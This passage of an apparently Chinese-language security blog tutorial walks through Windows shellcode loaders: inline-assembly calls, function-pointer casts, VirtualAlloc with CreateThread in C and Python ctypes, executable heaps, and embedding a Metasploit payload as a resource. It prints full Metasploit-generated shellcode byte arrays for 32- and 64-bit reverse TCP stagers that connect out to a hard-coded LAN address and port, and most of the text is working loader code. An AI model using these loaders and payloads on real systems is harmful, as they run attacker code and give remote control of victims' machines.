class="string">&quot;\x9c\xed\x92\x66\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\xe8\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\x36\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x50\x68\x3e\xba\x17\xa3\xff\xd5\x57\x68\xe6\xfc\xe1\xe2\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xfc\xd3\xf4\x5e\x6a\x00\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">	__asm &#123;</span><br><span class="line">		lea eax,buf    <span class="comment">// 将buf的地址加载到eax寄存器</span></span><br><span class="line">		call eax  <span class="comment">// 使用call指令跳转到eax寄存器指向的地址（即buf），开始执行shellcode</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="2-使用函数指针加载"><a href="#2-使用函数指针加载" class="headerlink" title="2.使用函数指针加载"></a>2.使用函数指针加载</h1><p>如下代码所示，<code>(void(*)(void))</code>是一个函数指针类型的强制转换, 该函数指针指向一个没有参数且返回值类型为void的函数，也就是说这行代码将 <code>buf</code> 的地址转换为一个函数指针，然后调用该指针所指向的函数，其实这种方法和上述加载方式原理是一样的，只不过这种方法还能用于加载64位的ShellCode</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) <span class="comment">//将data段的内存设置成可读可写可执行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ShellCode部分</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x07\x01\xc7\x49\x75\xef\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x8b\x48\x18\x8b\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1\xcf\x07\xac\x01\xc7\x38&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12&quot;</span></span><br><span class="line"><span class="string">&quot;\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\x68\xd2\x53\x6e\xfc\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29&quot;</span></span><br><span class="line"><span class="string">&quot;\xc4\x54\x50\x68\x9c\x13\x41\xc4\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x9b\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x2c\x9b\xfc\xa4\x50\x58\xff\xd5\x97\x6a\x10\x56\x57\x68\xb6\x59\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\x0e\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\xe8\xd9\xce\x36\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x9c\xed\x92\x66\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\xe8\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\x36\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x50\x68\x3e\xba\x17\xa3\xff\xd5\x57\x68\xe6\xfc\xe1\xe2\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xfc\xd3\xf4\x5e\x6a\x00\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">	((<span class="built_in">void</span>(*)(<span class="type">void</span>)) &amp; buf)();  <span class="comment">//执行ShellCode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="3-创建线程加载"><a href="#3-创建线程加载" class="headerlink" title="3.创建线程加载"></a>3.创建线程加载</h1><p>上述两种方法都需要将data节的内存设置成可读可写可执行,  以下这段代码的主要作用是在内存中分配一段可执行的内存空间，将buf数组中的内容复制到该内存空间，并创建一个新线程来执行这段内存中的代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x07\x01\xc7\x49\x75\xef\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x8b\x48\x18\x8b\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1\xcf\x07\xac\x01\xc7\x38&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12&quot;</span></span><br><span class="line"><span class="string">&quot;\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\x68\xd2\x53\x6e\xfc\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29&quot;</span></span><br><span class="line"><span class="string">&quot;\xc4\x54\x50\x68\x9c\x13\x41\xc4\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x9b\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x2c\x9b\xfc\xa4\x50\x58\xff\xd5\x97\x6a\x10\x56\x57\x68\xb6\x59\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\x0e\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\xe8\xd9\xce\x36\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x9c\xed\x92\x66\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\xe8\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\x36\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x50\x68\x3e\xba\x17\xa3\xff\xd5\x57\x68\xe6\xfc\xe1\xe2\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xfc\xd3\xf4\x5e\x6a\x00\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 申请一块可进行读写操作的内存</span></span><br><span class="line">    LPVOID pMemory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将buf数组中的内容复制到刚刚分配的内存中</span></span><br><span class="line">    <span class="built_in">RtlMoveMemory</span>(pMemory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个新的线程来执行内存中的代码</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pMemory, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待新创建的线程执行完成</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>下述是申请内存加载的python版本代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用MSF生成的python格式的ShellCode</span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x50\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x56\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x0f\xb7&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x4a\x4a\x48\x8b\x72\x50\x4d\x31\xc9\x48\x31\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x50&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x49\x01\xd0\x8b\x48\x18\xe3\x56\x48\xff\xc9\x4d&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x31\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x58\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x2f\x9b\x41\x54&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf0\xb5\xa2\x56\xff\xd5&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bytearray()函数返回一个新字节数组</span></span><br><span class="line">shellcode= <span class="built_in">bytearray</span>(buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#VirtualAlloc函数用来开辟内存空间,返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype= ctypes.c_uint64</span><br><span class="line">ptr= ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#RtlMoveMemory函数将Shellcode加载至此段内存空间</span></span><br><span class="line">buf= (ctypes.c_char *<span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">   ctypes.c_uint64(ptr),</span><br><span class="line">   buf,</span><br><span class="line">   ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用CreateThread函数创建一个线程从Shellcode的起始地址开始执行此段内存空间的内容</span></span><br><span class="line">handle= ctypes.windll.kernel32.CreateThread(</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_uint64(ptr),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过WaitForSingleObject函数来等待执行结束</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>



<h1 id="4-通过堆加载"><a href="#4-通过堆加载" class="headerlink" title="4.通过堆加载"></a>4.通过堆加载</h1><p>这段代码首先创建了一个具有执行权限的堆，然后在堆中分配内存并将shellcode复制到内存中。最后，代码通过直接调用存储在内存中的shellcode来执行它</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 shellcode（恶意代码）</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个具有执行权限的堆，以存储shellcode</span></span><br><span class="line">    HANDLE HeapHandle = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="built_in">sizeof</span>(shellcode), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在创建的堆中分配一块内存，并将其地址赋给buffer</span></span><br><span class="line">    <span class="type">char</span>* buffer = (<span class="type">char</span>*)<span class="built_in">HeapAlloc</span>(HeapHandle, HEAP_ZERO_MEMORY, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode复制到buffer指向的内存中</span></span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面是另一种创建线程的方法，这里被注释掉了</span></span><br><span class="line">    <span class="comment">// 创建一个新线程并执行buffer指向的内存中的shellcode</span></span><br><span class="line">    <span class="comment">// HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待新线程执行完毕</span></span><br><span class="line">    <span class="comment">// WaitForSingleObject(hThread, INFINITE);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将buffer指向的内存地址强制转换为一个函数指针，并调用该函数，执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)(<span class="type">void</span>)) buffer)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="5-基于资源节加载"><a href="#5-基于资源节加载" class="headerlink" title="5.基于资源节加载"></a>5.基于资源节加载</h1><h2 id="导入资源"><a href="#导入资源" class="headerlink" title="导入资源"></a>导入资源</h2><p>使用MSF生成bin文件，随后点击<code>添加资源-&gt;导入</code>，并选择生成的bin文件</p>
<p><img src="/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230419150951949.png" alt="image-20230419150951949">	</p>
<p>然后自定义bin文件的资源类型, 此处我自定义的类型为”shellcode”，当然你也可以定义成其它的名字</p>
<p><img src="/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230419151102352.png" alt="image-20230419151102352">	</p>
<p>添加完资源后会在当前项目生成一个<code>resource.h</code>, 代码如下所示，这里只需注意这段代码<code>#define IDR_SHELLCODE1 101</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#123;&#123;NO_DEPENDENCIES&#125;&#125;</span></span><br><span class="line"><span class="comment">// Microsoft Visual C++ 生成的包含文件。</span></span><br><span class="line"><span class="comment">// 供 Shellcode加载器.rc 使用</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//IDR_SHELLCODE1 通常用于标识和引用项目中的某个资源，例如嵌入到可执行文件中的二进制数据、图像或其他类型的资源，在项目的其他部分（例如代码或资源脚本中），可以通过使用 IDR_SHELLCODE1 符号来引用这个资源，而不是直接使用数字常量（如 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDR_SHELLCODE1                  101</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Next default values for new objects</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> APSTUDIO_INVOKED</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> APSTUDIO_READONLY_SYMBOLS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _APS_NEXT_RESOURCE_VALUE        102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _APS_NEXT_COMMAND_VALUE         40001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _APS_NEXT_CONTROL_VALUE         1001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _APS_NEXT_SYMED_VALUE           101</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>以下是完整shellcode加载器代码: </p>
